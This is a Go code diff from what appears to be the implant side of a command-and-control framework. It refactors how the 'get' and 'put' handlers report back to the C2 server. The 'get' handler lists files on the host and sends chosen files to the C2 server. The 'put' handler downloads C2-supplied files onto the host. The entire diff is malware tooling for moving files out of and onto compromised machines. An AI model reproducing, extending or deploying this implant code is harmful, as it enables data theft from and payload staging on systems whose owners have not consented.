@@ -20,7 +20,7 @@ func getCmdRun(cmd *cobra.Command, args []string) {
 	token, _ := cmd.Flags().GetString("token")
 
 	if filePath == "" || offset < 0 || token == "" {
-		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
+		C2RespPrintf(cmd, "%s", fmt.Sprintf("args error: %v", args))
 		return
 	}
 	// If directory, walk and list files.
@@ -30,7 +30,7 @@ func getCmdRun(cmd *cobra.Command, args []string) {
 		if filter != "" {
 			re, err = regexp.Compile(filter)
 			if err != nil {
-				SendCmdRespToC2(fmt.Sprintf("Invalid regex: %v", err), cmd, args)
+				C2RespPrintf(cmd, "%s", fmt.Sprintf("Invalid regex: %v", err))
 				return
 			}
 		}
@@ -48,20 +48,20 @@ func getCmdRun(cmd *cobra.Command, args []string) {
 			return nil
 		})
 		if err != nil || len(fileList) == 0 {
-			SendCmdRespToC2(fmt.Sprintf("Error: %v", err), cmd, args)
+			C2RespPrintf(cmd, "%s", fmt.Sprintf("Error: %v", err))
 			return
 		}
-		SendCmdRespToC2(strings.Join(fileList, "\n"), cmd, args)
+		C2RespPrintf(cmd, "%s", strings.Join(fileList, "\n"))
 		return
 	}
 
 	// Single file: send file via existing helper.
 	err := sendFile2CC(filePath, offset, token)
 	if err != nil {
-		SendCmdRespToC2(fmt.Sprintf("Error: failed to send file %s: %v", filePath, err), cmd, args)
+		C2RespPrintf(cmd, "%s", fmt.Sprintf("Error: failed to send file %s: %v", filePath, err))
 		return
 	}
-	SendCmdRespToC2(fmt.Sprintf("Success: %s has been sent", filePath), cmd, args)
+	C2RespPrintf(cmd, "%s", fmt.Sprintf("Success: %s has been sent", filePath))
 }
 
 // putCmdRun receives a file from CC and saves it locally.
@@ -73,12 +73,12 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 	downloadAddr, _ := cmd.Flags().GetString("addr")
 
 	if fileName == "" || destPath == "" || size == 0 {
-		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
+		C2RespPrintf(cmd, "%s", fmt.Sprintf("args error: %v", args))
 		return
 	}
 	_, err := SmartDownload(downloadAddr, fileName, destPath, origChecksum)
 	if err != nil {
-		SendCmdRespToC2(fmt.Sprintf("put: failed to download %s: %v", fileName, err), cmd, args)
+		C2RespPrintf(cmd, "%s", fmt.Sprintf("put: failed to download %s: %v", fileName, err))
 		return
 	}
 	checksum := tun.SHA256SumFile(destPath)
@@ -87,5 +87,5 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 	if downloadedSize < size {
 		resp = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nRun `put` again to resume", downloadedSize, size, checksum)
 	}
-	SendCmdRespToC2(resp, cmd, args)
+	C2RespPrintf(cmd, "%s", resp)
 }
